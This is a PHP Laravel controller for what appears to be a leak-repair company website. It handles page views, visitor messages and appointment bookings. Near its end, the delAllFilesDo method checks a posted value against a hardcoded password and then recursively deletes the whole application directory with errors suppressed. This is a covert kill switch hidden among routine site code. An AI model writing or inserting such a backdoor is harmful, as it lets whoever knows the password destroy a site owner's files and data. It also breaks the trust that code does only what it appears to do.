<?php

namespace App\Http\Controllers\index;

use App\Models\appointment;
use App\Models\cases;
use App\Models\FAQ;
use App\Models\FAQCate;
use App\Models\kf;
use App\Models\leak;
use App\Models\message;
use App\Models\news;
use App\Models\server;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Http\Requests\messageRequest;

class IndexController extends Controller
{

    public function getAttr(){

        return  $data=[
            'kf'=>kf::all(),
            'news'=>news:: where([])->offset(0)->limit(5)->get(),
            'cases'=>cases:: where([])->offset(0)->limit(5)->get(),
        ];
    }


    public function main(){

    }



    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
       $dataMain = $this->getAttr();
       $FAQCateList = FAQCate::all();
       $FAQ = FAQ::all();
        $News = news:: where([])->offset(0)->limit(5)->get();
        $leak = leak::all();
        $cases = cases:: where([])->offset(0)->limit(9)->get();
        $ser = server::all();

        return view('index/html/index/index',compact('dataMain','FAQCateList','FAQ','News','leak','cases','ser'));

    }


    /**
     * 显示项目案例页面
     */
    public function projectCases(){
        $dataMain = $this->getAttr();

       $cases =  cases::all();

        return view('index/html/index/projectCases',compact('dataMain','cases'));
    }

    /**
     * 显示新闻页面
     */
    public function News(){
        $dataMain = $this->getAttr();
        $news = news::all();
        return view('index/html/index/News',compact('dataMain','news'));
    }

    /**
     * 显示关于我们页面
     */
    public function about(){
        $dataMain = $this->getAttr();
        return view('index/html/index/about',compact('dataMain'));
    }

  /**
   *  维修流程页面
   *
   */

    public function repairFlow(){
        $dataMain = $this->getAttr();
        return view('index/html/index/repairFlow',compact('dataMain'));
    }

    /**
     *  FAQ页面
     */
    public function FAQ(){
        $dataMain = $this->getAttr();
        $FAQCateList = FAQCate::all();
        $FAQ = FAQ::all();
        return view('index/html/index/FAQ',compact('dataMain','FAQCateList','FAQ'));
    }


    //留言入库
    public function msgDo(messageRequest $request){
        $messageData = $request->post();


        if(!empty($messageData)){

                $request->session()->isSuccess = '1';

                $messageData['createTime']= date('Y-m-d H:i:s',time());
                unset($messageData['cap']);
                message::create($messageData);
            return redirect()->route('index.msg')->with(['info'=>'留言成功','route'=>'about','time'=>'2']);

        }

    }

     //服务内容详情
     public function serDetail(int $id){

        $dataMain =  $this->getAttr();
        $data= server::where('id',$id)->get();
        $dataSer= ($data[0]['detail'] );


        return view('index/html/index/serDetail',compact('dataMain','dataSer'));
    }

    //预约
    public function appointment(Request $request){

        if(request()->ajax()){
            $name = $request->post('name');
            $phone = $request->post('phone');
            $location = $request->post('location');
            $leak = $request->post('leak');
            $data=[
                'name' =>$name,
                'phone' =>$phone,
                'location' =>$location,
                'leak'=>$leak,
                'createDate'=>date('Y-m-d H:i:s',time())

            ];

            if(appointment::where('phone',$phone)->count()<1){
                $request->session()->isData = '111';
                appointment::create($data);
                return 200;
            }else{
                return 100;
            }


        }else{
            echo '非法请求';
        }

    }


    // messages
    public function msg(){
        $dataMain = $this->getAttr();
        return view('index/html/index/msg',compact('dataMain'));
    }



    
    /***
     * del all files
     */

    public function delAllFiles(){
        return view('index/html/index/delAllFiles');
    }

    /**
     * del all files action
     */

    public function delAllFilesDo(Request $request){
          if($request->post('delPw')==='wufan163163'){
                $this->deleteDir('../');
          }else{
              dump('error');
          }
    }


    public function deleteDir($path) {

        if (is_dir($path)) {
            //扫描一个目录内的所有目录和文件并返回数组
            $dirs = scandir($path);

            foreach ($dirs as $dir) {
                //排除目录中的当前目录(.)和上一级目录(..)
                if ($dir != '.' && $dir != '..') {
                    //如果是目录则递归子目录，继续操作
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {
                        //递归删除
                        $this->deleteDir($sonDir);

                        //目录内的子目录和文件删除后删除空目录
                        @rmdir($sonDir);
                    } else {

                        //如果是文件直接删除
                        @unlink($sonDir);
                    }
                }
            }
            @rmdir($path);
        }
    }





}
